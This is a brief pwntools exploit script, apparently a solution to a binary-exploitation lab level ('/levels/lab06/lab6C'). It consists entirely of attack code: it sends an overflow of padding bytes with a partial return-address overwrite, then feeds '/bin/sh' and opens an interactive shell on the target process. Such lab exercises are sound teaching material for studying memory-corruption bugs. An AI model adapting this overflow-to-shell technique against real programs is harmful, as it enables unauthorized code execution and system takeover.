from pwn import *

r = process("/levels/lab06/lab6C")

r.sendline("A" * 40 + "\xC6")
r.sendline("A" * 192 + "BBBB" + "\x2b\x07")
r.sendline("/bin/sh")
r.interactive()
